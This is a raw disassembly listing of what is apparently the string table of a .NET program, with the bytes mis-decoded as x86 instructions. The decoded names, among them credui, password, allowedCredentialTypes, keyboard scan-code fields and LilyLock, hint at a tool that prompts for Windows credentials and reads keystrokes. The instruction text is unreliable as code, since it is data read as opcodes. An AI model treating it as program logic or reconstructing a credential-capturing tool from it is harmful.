  4081fd:	72 76                	jb     0x408275
  4081ff:	65 64 31 00          	gs xor %eax,%fs:(%eax)
  408203:	69 45 72 72 6f 72 00 	imul   $0x726f72,0x72(%ebp),%eax
  40820a:	75 73                	jne    0x40827f
  40820c:	65 72 4e             	gs jb  0x40825d
  40820f:	61                   	popa
  408210:	6d                   	insl   (%dx),%es:(%edi)
  408211:	65 00 6d 61          	add    %ch,%gs:0x61(%ebp)
  408215:	78 55                	js     0x40826c
  408217:	73 65                	jae    0x40827e
  408219:	72 4e                	jb     0x408269
  40821b:	61                   	popa
  40821c:	6d                   	insl   (%dx),%es:(%edi)
  40821d:	65 00 70 61          	add    %dh,%gs:0x61(%eax)
  408221:	73 73                	jae    0x408296
  408223:	77 6f                	ja     0x408294
  408225:	72 64                	jb     0x40828b
  408227:	00 6d 61             	add    %ch,0x61(%ebp)
  40822a:	78 50                	js     0x40827c
  40822c:	61                   	popa
  40822d:	73 73                	jae    0x4082a2
  40822f:	77 6f                	ja     0x4082a0
  408231:	72 64                	jb     0x408297
  408233:	00 70 66             	add    %dh,0x66(%eax)
  408236:	53                   	push   %ebx
  408237:	61                   	popa
  408238:	76 65                	jbe    0x40829f
  40823a:	00 53 79             	add    %dl,0x79(%ebx)
  40823d:	73 74                	jae    0x4082b3
  40823f:	65 6d                	gs insl (%dx),%es:(%edi)
  408241:	2e 52                	cs push %edx
  408243:	75 6e                	jne    0x4082b3
  408245:	74 69                	je     0x4082b0
  408247:	6d                   	insl   (%dx),%es:(%edi)
  408248:	65 2e 49             	gs cs dec %ecx
  40824b:	6e                   	outsb  %ds:(%esi),(%dx)
  40824c:	74 65                	je     0x4082b3
  40824e:	72 6f                	jb     0x4082bf
  408250:	70 53                	jo     0x4082a5
  408252:	65 72 76             	gs jb  0x4082cb
  408255:	69 63 65 73 00 4d 61 	imul   $0x614d0073,0x65(%ebx),%esp
  40825c:	72 73                	jb     0x4082d1
  40825e:	68 61 6c 41 73       	push   $0x73416c61
  408263:	41                   	inc    %ecx
  408264:	74 74                	je     0x4082da
  408266:	72 69                	jb     0x4082d1
  408268:	62 75 74             	bound  %esi,0x74(%ebp)
  40826b:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  40826f:	6d                   	insl   (%dx),%es:(%edi)
  408270:	61                   	popa
  408271:	6e                   	outsb  %ds:(%esi),(%dx)
  408272:	61                   	popa
  408273:	67 65 64 54          	addr16 gs fs push %esp
  408277:	79 70                	jns    0x4082e9
  408279:	65 00 66 6c          	add    %ah,%gs:0x6c(%esi)
  40827d:	61                   	popa
  40827e:	67 73 00             	addr16 jae 0x408281
  408281:	63 61 70             	arpl   %esp,0x70(%ecx)
  408284:	74 69                	je     0x4082ef
  408286:	6f                   	outsl  %ds:(%esi),(%dx)
  408287:	6e                   	outsb  %ds:(%esi),(%dx)
  408288:	00 6d 65             	add    %ch,0x65(%ebp)
  40828b:	73 73                	jae    0x408300
  40828d:	61                   	popa
  40828e:	67 65 00 74 61       	add    %dh,%gs:0x61(%si)
  408293:	72 67                	jb     0x4082fc
  408295:	65 74 00             	gs je  0x408298
  408298:	75 73                	jne    0x40830d
  40829a:	65 72 00             	gs jb  0x40829d
  40829d:	63 72 65             	arpl   %esi,0x65(%edx)
  4082a0:	64 54                	fs push %esp
  4082a2:	79 70                	jns    0x408314
  4082a4:	65 73 00             	gs jae 0x4082a7
  4082a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4082a8:	70 74                	jo     0x40831e
  4082aa:	69 6f 6e 73 00 76 61 	imul   $0x61760073,0x6e(%edi),%ebp
  4082b1:	6c                   	insb   (%dx),%es:(%edi)
  4082b2:	75 65                	jne    0x408319
  4082b4:	00 72 65             	add    %dh,0x65(%edx)
  4082b7:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  4082bb:	67 6c                	insb   (%dx),%es:(%di)
  4082bd:	65 00 73 6f          	add    %dh,%gs:0x6f(%ebx)
  4082c1:	75 72                	jne    0x408335
  4082c3:	63 65 00             	arpl   %esp,0x0(%ebp)
  4082c6:	64 65 73 74          	fs gs jae 0x40833e
  4082ca:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  4082d1:	00 63 6c             	add    %ah,0x6c(%ebx)
  4082d4:	69 70 00 66 69 6c 6c 	imul   $0x6c6c6966,0x0(%eax),%esi
  4082db:	00 6f 72             	add    %ch,0x72(%edi)
  4082de:	69 67 69 6e 00 63 6f 	imul   $0x6f63006e,0x69(%edi),%esp
  4082e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4082e6:	74 65                	je     0x40834d
  4082e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4082e9:	74 73                	je     0x40835e
  4082eb:	00 73 74             	add    %dh,0x74(%ebx)
  4082ee:	72 49                	jb     0x408339
  4082f0:	64 00 73 74          	add    %dh,%fs:0x74(%ebx)
  4082f4:	72 54                	jb     0x40834a
  4082f6:	69 74 6c 65 00 73 74 	imul   $0x72747300,0x65(%esp,%ebp,2),%esi
  4082fd:	72 
  4082fe:	50                   	push   %eax
  4082ff:	72 6f                	jb     0x408370
  408301:	6d                   	insl   (%dx),%es:(%edi)
  408302:	70 74                	jo     0x408378
  408304:	00 73 74             	add    %dh,0x74(%ebx)
  408307:	72 56                	jb     0x40835f
  408309:	61                   	popa
  40830a:	6c                   	insb   (%dx),%es:(%edi)
  40830b:	00 62 6c             	add    %ah,0x6c(%edx)
  40830e:	53                   	push   %ebx
  40830f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408313:	65 00 61 72          	add    %ah,%gs:0x72(%ecx)
  408317:	72 43                	jb     0x40835c
  408319:	68 6f 69 63 65       	push   $0x6563696f
  40831e:	00 69 6e             	add    %ch,0x6e(%ecx)
  408321:	74 44                	je     0x408367
  408323:	65 66 61             	gs popaw
  408326:	75 6c                	jne    0x408394
  408328:	74 00                	je     0x40832a
  40832a:	77 56                	ja     0x408382
  40832c:	69 72 74 4b 65 79 00 	imul   $0x79654b,0x74(%edx),%esi
  408333:	77 53                	ja     0x408388
  408335:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  408338:	43                   	inc    %ebx
  408339:	6f                   	outsl  %ds:(%esi),(%dx)
  40833a:	64 65 00 6c 70 4b    	fs add %ch,%gs:0x4b(%eax,%esi,2)
  408340:	65 79 53             	gs jns 0x408396
  408343:	74 61                	je     0x4083a6
  408345:	74 65                	je     0x4083ac
  408347:	00 70 77             	add    %dh,0x77(%eax)
  40834a:	73 7a                	jae    0x4083c6
  40834c:	42                   	inc    %edx
  40834d:	75 66                	jne    0x4083b5
  40834f:	66 00 4f 75          	data16 add %cl,0x75(%edi)
  408353:	74 41                	je     0x408396
  408355:	74 74                	je     0x4083cb
  408357:	72 69                	jb     0x4083c2
  408359:	62 75 74             	bound  %esi,0x74(%ebp)
  40835c:	65 00 63 63          	add    %ah,%gs:0x63(%ebx)
  408360:	68 42 75 66 66       	push   $0x66667542
  408365:	00 77 46             	add    %dh,0x46(%edi)
  408368:	6c                   	insb   (%dx),%es:(%edi)
  408369:	61                   	popa
  40836a:	67 73 00             	addr16 jae 0x40836d
  40836d:	6b 65 79 73          	imul   $0x73,0x79(%ebp),%esp
  408371:	00 62 6c             	add    %ah,0x6c(%edx)
  408374:	53                   	push   %ebx
  408375:	68 69 66 74 00       	push   $0x746669
  40837a:	62 6c 41 6c          	bound  %ebp,0x6c(%ecx,%eax,2)
  40837e:	74 47                	je     0x4083c7
  408380:	72 00                	jb     0x408382
  408382:	62 6c 49 6e          	bound  %ebp,0x6e(%ecx,%ecx,2)
  408386:	63 6c 75 64          	arpl   %ebp,0x64(%ebp,%esi,2)
  40838a:	65 4b                	gs dec %ebx
  40838c:	65 79 44             	gs jns 0x4083d3
  40838f:	6f                   	outsl  %ds:(%esi),(%dx)
  408390:	77 6e                	ja     0x408400
  408392:	00 73 65             	add    %dh,0x65(%ebx)
  408395:	6e                   	outsb  %ds:(%esi),(%dx)
  408396:	64 65 72 00          	fs gs jb 0x40839a
  40839a:	65 00 63 6f          	add    %ah,%gs:0x6f(%ebx)
  40839e:	6c                   	insb   (%dx),%es:(%edi)
  40839f:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a0:	72 00                	jb     0x4083a2
  4083a2:	70 64                	jo     0x408408
  4083a4:	00 70 6f             	add    %dh,0x6f(%eax)
  4083a7:	73 69                	jae    0x408412
  4083a9:	74 69                	je     0x408414
  4083ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4083ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ad:	00 42 61             	add    %al,0x61(%edx)
  4083b0:	72 43                	jb     0x4083f5
  4083b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b3:	6c                   	insb   (%dx),%es:(%edi)
  4083b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b5:	72 00                	jb     0x4083b7
  4083b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b8:	62 6a 52             	bound  %ebp,0x52(%edx)
  4083bb:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  4083bf:	64 00 73 74          	add    %dh,%fs:0x74(%ebx)
  4083c3:	64 48                	fs dec %eax
  4083c5:	61                   	popa
  4083c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4083c7:	64 6c                	fs insb (%dx),%es:(%edi)
  4083c9:	65 00 68 46          	add    %ch,%gs:0x46(%eax)
  4083cd:	69 6c 65 00 64 65 73 	imul   $0x63736564,0x0(%ebp,%eiz,2),%ebp
  4083d4:	63 
  4083d5:	72 69                	jb     0x408440
  4083d7:	70 74                	jo     0x40844d
  4083d9:	69 6f 6e 73 00 63 68 	imul   $0x68630073,0x6e(%edi),%ebp
  4083e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4083e1:	69 63 65 73 00 64 65 	imul   $0x65640073,0x65(%ebx),%esp
  4083e8:	66 61                	popaw
  4083ea:	75 6c                	jne    0x408458
  4083ec:	74 43                	je     0x408431
  4083ee:	68 6f 69 63 65       	push   $0x6563696f
  4083f3:	00 61 6c             	add    %ah,0x6c(%ecx)
  4083f6:	6c                   	insb   (%dx),%es:(%edi)
  4083f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4083f8:	77 65                	ja     0x40845f
  4083fa:	64 43                	fs inc %ebx
  4083fc:	72 65                	jb     0x408463
  4083fe:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408401:	74 69                	je     0x40846c
  408403:	61                   	popa
  408404:	6c                   	insb   (%dx),%es:(%edi)
  408405:	54                   	push   %esp
  408406:	79 70                	jns    0x408478
  408408:	65 73 00             	gs jae 0x40840b
  40840b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40840d:	72 65                	jb     0x408474
  40840f:	67 72 6f             	addr16 jb 0x408481
  408412:	75 6e                	jne    0x408482
  408414:	64 43                	fs inc %ebx
  408416:	6f                   	outsl  %ds:(%esi),(%dx)
  408417:	6c                   	insb   (%dx),%es:(%edi)
  408418:	6f                   	outsl  %ds:(%esi),(%dx)
  408419:	72 00                	jb     0x40841b
  40841b:	62 61 63             	bound  %esp,0x63(%ecx)
  40841e:	6b 67 72 6f          	imul   $0x6f,0x72(%edi),%esp
  408422:	75 6e                	jne    0x408492
  408424:	64 43                	fs inc %ebx
  408426:	6f                   	outsl  %ds:(%esi),(%dx)
  408427:	6c                   	insb   (%dx),%es:(%edi)
  408428:	6f                   	outsl  %ds:(%esi),(%dx)
  408429:	72 00                	jb     0x40842b
  40842b:	73 6f                	jae    0x40849c
  40842d:	75 72                	jne    0x4084a1
  40842f:	63 65 49             	arpl   %esp,0x49(%ebp)
  408432:	64 00 72 65          	add    %dh,%fs:0x65(%edx)
  408436:	63 6f 72             	arpl   %ebp,0x72(%edi)
  408439:	64 00 61 70          	add    %ah,%fs:0x70(%ecx)
  40843d:	70 00                	jo     0x40843f
  40843f:	61                   	popa
  408440:	72 67                	jb     0x4084a9
  408442:	73 00                	jae    0x408444
  408444:	53                   	push   %ebx
  408445:	79 73                	jns    0x4084ba
  408447:	74 65                	je     0x4084ae
  408449:	6d                   	insl   (%dx),%es:(%edi)
  40844a:	2e 52                	cs push %edx
  40844c:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40844f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408454:	6e                   	outsb  %ds:(%esi),(%dx)
  408455:	00 41 73             	add    %al,0x73(%ecx)
  408458:	73 65                	jae    0x4084bf
  40845a:	6d                   	insl   (%dx),%es:(%edi)
  40845b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40845f:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408466:	72 
  408467:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40846e:	73 73                	jae    0x4084e3
  408470:	65 6d                	gs insl (%dx),%es:(%edi)
  408472:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408476:	72 6f                	jb     0x4084e7
  408478:	64 75 63             	fs jne 0x4084de
  40847b:	74 41                	je     0x4084be
  40847d:	74 74                	je     0x4084f3
  40847f:	72 69                	jb     0x4084ea
  408481:	62 75 74             	bound  %esi,0x74(%ebp)
  408484:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408488:	73 65                	jae    0x4084ef
  40848a:	6d                   	insl   (%dx),%es:(%edi)
  40848b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40848f:	6f                   	outsl  %ds:(%esi),(%dx)
  408490:	70 79                	jo     0x40850b
  408492:	72 69                	jb     0x4084fd
  408494:	67 68 74 41 74 74    	addr16 push $0x74744174
  40849a:	72 69                	jb     0x408505
  40849c:	62 75 74             	bound  %esi,0x74(%ebp)
  40849f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4084a3:	73 65                	jae    0x40850a
  4084a5:	6d                   	insl   (%dx),%es:(%edi)
  4084a6:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4084aa:	72 61                	jb     0x40850d
  4084ac:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4084af:	61                   	popa
  4084b0:	72 6b                	jb     0x40851d
  4084b2:	41                   	inc    %ecx
  4084b3:	74 74                	je     0x408529
  4084b5:	72 69                	jb     0x408520
  4084b7:	62 75 74             	bound  %esi,0x74(%ebp)
  4084ba:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4084be:	73 65                	jae    0x408525
  4084c0:	6d                   	insl   (%dx),%es:(%edi)
  4084c1:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4084c5:	65 73 63             	gs jae 0x40852b
  4084c8:	72 69                	jb     0x408533
  4084ca:	70 74                	jo     0x408540
  4084cc:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4084d3:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4084da:	73 73                	jae    0x40854f
  4084dc:	65 6d                	gs insl (%dx),%es:(%edi)
  4084de:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4084e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4084e3:	6d                   	insl   (%dx),%es:(%edi)
  4084e4:	70 61                	jo     0x408547
  4084e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e7:	79 41                	jns    0x40852a
  4084e9:	74 74                	je     0x40855f
  4084eb:	72 69                	jb     0x408556
  4084ed:	62 75 74             	bound  %esi,0x74(%ebp)
  4084f0:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  4084f4:	73 74                	jae    0x40856a
  4084f6:	65 6d                	gs insl (%dx),%es:(%edi)
  4084f8:	2e 52                	cs push %edx
  4084fa:	75 6e                	jne    0x40856a
  4084fc:	74 69                	je     0x408567
  4084fe:	6d                   	insl   (%dx),%es:(%edi)
  4084ff:	65 2e 43             	gs cs inc %ebx
  408502:	6f                   	outsl  %ds:(%esi),(%dx)
  408503:	6d                   	insl   (%dx),%es:(%edi)
  408504:	70 69                	jo     0x40856f
  408506:	6c                   	insb   (%dx),%es:(%edi)
  408507:	65 72 53             	gs jb  0x40855d
  40850a:	65 72 76             	gs jb  0x408583
  40850d:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  408514:	6d                   	insl   (%dx),%es:(%edi)
  408515:	70 69                	jo     0x408580
  408517:	6c                   	insb   (%dx),%es:(%edi)
  408518:	61                   	popa
  408519:	74 69                	je     0x408584
  40851b:	6f                   	outsl  %ds:(%esi),(%dx)
  40851c:	6e                   	outsb  %ds:(%esi),(%dx)
  40851d:	52                   	push   %edx
  40851e:	65 6c                	gs insb (%dx),%es:(%edi)
  408520:	61                   	popa
  408521:	78 61                	js     0x408584
  408523:	74 69                	je     0x40858e
  408525:	6f                   	outsl  %ds:(%esi),(%dx)
  408526:	6e                   	outsb  %ds:(%esi),(%dx)
  408527:	73 41                	jae    0x40856a
  408529:	74 74                	je     0x40859f
  40852b:	72 69                	jb     0x408596
  40852d:	62 75 74             	bound  %esi,0x74(%ebp)
  408530:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408534:	6e                   	outsb  %ds:(%esi),(%dx)
  408535:	74 69                	je     0x4085a0
  408537:	6d                   	insl   (%dx),%es:(%edi)
  408538:	65 43                	gs inc %ebx
  40853a:	6f                   	outsl  %ds:(%esi),(%dx)
  40853b:	6d                   	insl   (%dx),%es:(%edi)
  40853c:	70 61                	jo     0x40859f
  40853e:	74 69                	je     0x4085a9
  408540:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408543:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40854a:	69 
  40854b:	62 75 74             	bound  %esi,0x74(%ebp)
  40854e:	65 00 4c 69 6c       	add    %cl,%gs:0x6c(%ecx,%ebp,2)
  408553:	79 4c                	jns    0x4085a1
  408555:	6f                   	outsl  %ds:(%esi),(%dx)
  408556:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408559:	44                   	inc    %esp
  40855a:	6c                   	insb   (%dx),%es:(%edi)
  40855b:	6c                   	insb   (%dx),%es:(%edi)
  40855c:	49                   	dec    %ecx
  40855d:	6d                   	insl   (%dx),%es:(%edi)
  40855e:	70 6f                	jo     0x4085cf
  408560:	72 74                	jb     0x4085d6
  408562:	41                   	inc    %ecx
  408563:	74 74                	je     0x4085d9
  408565:	72 69                	jb     0x4085d0
  408567:	62 75 74             	bound  %esi,0x74(%ebp)
  40856a:	65 00 63 72          	add    %ah,%gs:0x72(%ebx)
  40856e:	65 64 75 69          	gs fs jne 0x4085db
  408572:	00 53 74             	add    %dl,0x74(%ebx)
  408575:	72 69                	jb     0x4085e0
  408577:	6e                   	outsb  %ds:(%esi),(%dx)
  408578:	67 00 49 73          	add    %cl,0x73(%bx,%di)
  40857c:	4e                   	dec    %esi
  40857d:	75 6c                	jne    0x4085eb
  40857f:	6c                   	insb   (%dx),%es:(%edi)
  408580:	4f                   	dec    %edi
  408581:	72 45                	jb     0x4085c8
  408583:	6d                   	insl   (%dx),%es:(%edi)
  408584:	70 74                	jo     0x4085fa
  408586:	79 00                	jns    0x408588
  408588:	4d                   	dec    %ebp
  408589:	61                   	popa
  40858a:	72 73                	jb     0x4085ff
  40858c:	68 61 6c 00 53       	push   $0x53006c61
  408591:	69 7a 65 4f 66 00 49 	imul   $0x4900664f,0x65(%edx),%edi
  408598:	6e                   	outsb  %ds:(%esi),(%dx)
  408599:	74 50                	je     0x4085eb
  40859b:	74 72                	je     0x40860f
  40859d:	00 5a 65             	add    %bl,0x65(%edx)
  4085a0:	72 6f                	jb     0x408611
  4085a2:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  4085a6:	74 72                	je     0x40861a
  4085a8:	69 6e 67 00 53 74 72 	imul   $0x72745300,0x67(%esi),%ebp
  4085af:	75 63                	jne    0x408614
  4085b1:	74 4c                	je     0x4085ff
  4085b3:	61                   	popa
  4085b4:	79 6f                	jns    0x408625
  4085b6:	75 74                	jne    0x40862c
  4085b8:	41                   	inc    %ecx
  4085b9:	74 74                	je     0x40862f
  4085bb:	72 69                	jb     0x408626
  4085bd:	62 75 74             	bound  %esi,0x74(%ebp)
  4085c0:	65 00 4c 61 79       	add    %cl,%gs:0x79(%ecx,%eiz,2)
  4085c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4085c6:	75 74                	jne    0x40863c
  4085c8:	4b                   	dec    %ebx
  4085c9:	69 6e 64 00 46 6c 61 	imul   $0x616c4600,0x64(%esi),%ebp
  4085d0:	67 73 41             	addr16 jae 0x408614
  4085d3:	74 74                	je     0x408649
  4085d5:	72 69                	jb     0x408640
  4085d7:	62 75 74             	bound  %esi,0x74(%ebp)
  4085da:	65 00 45 6d          	add    %al,%gs:0x6d(%ebp)
  4085de:	70 74                	jo     0x408654
  4085e0:	79 00                	jns    0x4085e2
  4085e2:	43                   	inc    %ebx
  4085e3:	6c                   	insb   (%dx),%es:(%edi)
  4085e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4085e5:	73 65                	jae    0x40864c
  4085e7:	00 73 65             	add    %dh,0x65(%ebx)
  4085ea:	74 5f                	je     0x40864b
  4085ec:	4f                   	dec    %edi
  4085ed:	70 61                	jo     0x408650
  4085ef:	63 69 74             	arpl   %ebp,0x74(%ecx)
  4085f2:	79 00                	jns    0x4085f4
  4085f4:	73 65                	jae    0x40865b
  4085f6:	74 5f                	je     0x408657
  4085f8:	53                   	push   %ebx
  4085f9:	68 6f 77 49 6e       	push   $0x6e49776f
  4085fe:	54                   	push   %esp
  4085ff:	61                   	popa
  408600:	73 6b                	jae    0x40866d
  408602:	62 61 72             	bound  %esp,0x72(%ecx)
  408605:	00 43 6f             	add    %al,0x6f(%ebx)
  408608:	6e                   	outsb  %ds:(%esi),(%dx)
  408609:	74 72                	je     0x40867d
  40860b:	6f                   	outsl  %ds:(%esi),(%dx)
  40860c:	6c                   	insb   (%dx),%es:(%edi)
  40860d:	00 73 65             	add    %dh,0x65(%ebx)
  408610:	74 5f                	je     0x408671
  408612:	56                   	push   %esi
  408613:	69 73 69 62 6c 65 00 	imul   $0x656c62,0x69(%ebx),%esi
  40861a:	67 65 74 5f          	addr16 gs je 0x40867d
  40861e:	42                   	inc    %edx
  40861f:	6f                   	outsl  %ds:(%esi),(%dx)
  408620:	74 74                	je     0x408696
  408622:	6f                   	outsl  %ds:(%esi),(%dx)
  408623:	6d                   	insl   (%dx),%es:(%edi)
  408624:	00 67 65             	add    %ah,0x65(%edi)
  408627:	74 5f                	je     0x408688
  408629:	54                   	push   %esp
  40862a:	6f                   	outsl  %ds:(%esi),(%dx)
  40862b:	70 00                	jo     0x40862d
  40862d:	67 65 74 5f          	addr16 gs je 0x408690
  408631:	52                   	push   %edx
  408632:	69 67 68 74 00 67 65 	imul   $0x65670074,0x68(%edi),%esp
  408639:	74 5f                	je     0x40869a
  40863b:	4c                   	dec    %esp
  40863c:	65 66 74 00          	gs data16 je 0x408640
  408640:	41                   	inc    %ecx
  408641:	64 64 72 65          	fs fs jb 0x4086aa
  408645:	73 73                	jae    0x4086ba
  408647:	00 42 75             	add    %al,0x75(%edx)
  40864a:	66 66 65 72 43       	data16 data16 gs jb 0x408692
  40864f:	65 6c                	gs insb (%dx),%es:(%edi)
  408651:	6c                   	insb   (%dx),%es:(%edi)
  408652:	54                   	push   %esp
  408653:	79 70                	jns    0x4086c5
  408655:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408659:	74 5f                	je     0x4086ba
  40865b:	58                   	pop    %eax
  40865c:	00 73 65             	add    %dh,0x65(%ebx)
  40865f:	74 5f                	je     0x4086c0
  408661:	59                   	pop    %ecx
  408662:	00 73 65             	add    %dh,0x65(%ebx)
  408665:	74 5f                	je     0x4086c6
  408667:	48                   	dec    %eax
  408668:	65 69 67 68 74 00 73 	imul   $0x65730074,%gs:0x68(%edi),%esp
  40866f:	65 
  408670:	74 5f                	je     0x4086d1
  408672:	57                   	push   %edi
  408673:	69 64 74 68 00 41 70 	imul   $0x70704100,0x68(%esp,%esi,2),%esp
  40867a:	70 
  40867b:	44                   	inc    %esp
  40867c:	6f                   	outsl  %ds:(%esi),(%dx)
  40867d:	6d                   	insl   (%dx),%es:(%edi)
  40867e:	61                   	popa
  40867f:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  408686:	43                   	inc    %ebx
  408687:	75 72                	jne    0x4086fb
  408689:	72 65                	jb     0x4086f0
  40868b:	6e                   	outsb  %ds:(%esi),(%dx)
  40868c:	74 44                	je     0x4086d2
  40868e:	6f                   	outsl  %ds:(%esi),(%dx)
  40868f:	6d                   	insl   (%dx),%es:(%edi)
  408690:	61                   	popa
  408691:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  408698:	46                   	inc    %esi
  408699:	72 69                	jb     0x408704
  40869b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40869d:	64 6c                	fs insb (%dx),%es:(%edi)
  40869f:	79 4e                	jns    0x4086ef
  4086a1:	61                   	popa
  4086a2:	6d                   	insl   (%dx),%es:(%edi)
  4086a3:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  4086a7:	65 72 33             	gs jb  0x4086dd
  4086aa:	32 2e                	xor    (%esi),%ch
  4086ac:	64 6c                	fs insb (%dx),%es:(%edi)
  4086ae:	6c                   	insb   (%dx),%es:(%edi)
  4086af:	00 53 69             	add    %dl,0x69(%ebx)
  4086b2:	7a 65                	jp     0x408719
  4086b4:	46                   	inc    %esi
  4086b5:	00 43 6f             	add    %al,0x6f(%ebx)
  4086b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b9:	74 61                	je     0x40871c
  4086bb:	69 6e 65 72 43 6f 6e 	imul   $0x6e6f4372,0x65(%esi),%ebp
  4086c2:	74 72                	je     0x408736
  4086c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c5:	6c                   	insb   (%dx),%es:(%edi)
  4086c6:	00 73 65             	add    %dh,0x65(%ebx)
  4086c9:	74 5f                	je     0x40872a
  4086cb:	41                   	inc    %ecx
  4086cc:	75 74                	jne    0x408742
  4086ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4086cf:	53                   	push   %ebx
  4086d0:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086d3:	65 44                	gs inc %esp
  4086d5:	69 6d 65 6e 73 69 6f 	imul   $0x6f69736e,0x65(%ebp),%ebp
  4086dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4086dd:	73 00                	jae    0x4086df
  4086df:	41                   	inc    %ecx
  4086e0:	75 74                	jne    0x408756
  4086e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4086e3:	53                   	push   %ebx
  4086e4:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086e7:	65 4d                	gs dec %ebp
  4086e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4086ea:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  4086ef:	74 5f                	je     0x408750
  4086f1:	41                   	inc    %ecx
  4086f2:	75 74                	jne    0x408768
  4086f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086f5:	53                   	push   %ebx
  4086f6:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086f9:	65 4d                	gs dec %ebp
  4086fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4086fc:	64 65 00 54 65 78    	fs add %dl,%gs:0x78(%ebp,%eiz,2)
  408702:	74 42                	je     0x408746
  408704:	6f                   	outsl  %ds:(%esi),(%dx)
  408705:	78 00                	js     0x408707
  408707:	42                   	inc    %edx
  408708:	75 74                	jne    0x40877e
  40870a:	74 6f                	je     0x40877b
  40870c:	6e                   	outsb  %ds:(%esi),(%dx)
  40870d:	00 73 65             	add    %dh,0x65(%ebx)
  408710:	74 5f                	je     0x408771
  408712:	54                   	push   %esp
  408713:	65 78 74             	gs js  0x40878a
  408716:	00 50 6f             	add    %dl,0x6f(%eax)
  408719:	69 6e 74 00 73 65 74 	imul   $0x74657300,0x74(%esi),%ebp
  408720:	5f                   	pop    %edi
  408721:	4c                   	dec    %esp
  408722:	6f                   	outsl  %ds:(%esi),(%dx)
  408723:	63 61 74             	arpl   %esp,0x74(%ecx)
  408726:	69 6f 6e 00 53 63 72 	imul   $0x72635300,0x6e(%edi),%ebp
  40872d:	65 65 6e             	gs outsb %gs:(%esi),(%dx)
  408730:	00 46 72             	add    %al,0x72(%esi)
  408733:	6f                   	outsl  %ds:(%esi),(%dx)
  408734:	6d                   	insl   (%dx),%es:(%edi)
  408735:	43                   	inc    %ebx
  408736:	6f                   	outsl  %ds:(%esi),(%dx)
  408737:	6e                   	outsb  %ds:(%esi),(%dx)
  408738:	74 72                	je     0x4087ac
  40873a:	6f                   	outsl  %ds:(%esi),(%dx)
  40873b:	6c                   	insb   (%dx),%es:(%edi)
  40873c:	00 67 65             	add    %ah,0x65(%edi)
  40873f:	74 5f                	je     0x4087a0
  408741:	42                   	inc    %edx
  408742:	6f                   	outsl  %ds:(%esi),(%dx)
  408743:	75 6e                	jne    0x4087b3
  408745:	64 73 00             	fs jae 0x408748
  408748:	67 65 74 5f          	addr16 gs je 0x4087ab
  40874c:	57                   	push   %edi
  40874d:	69 64 74 68 00 73 65 	imul   $0x74657300,0x68(%esp,%esi,2),%esp
  408754:	74 
  408755:	5f                   	pop    %edi
  408756:	4d                   	dec    %ebp
  408757:	61                   	popa
  408758:	78 69                	js     0x4087c3
  40875a:	6d                   	insl   (%dx),%es:(%edi)
  40875b:	75 6d                	jne    0x4087ca
  40875d:	53                   	push   %ebx
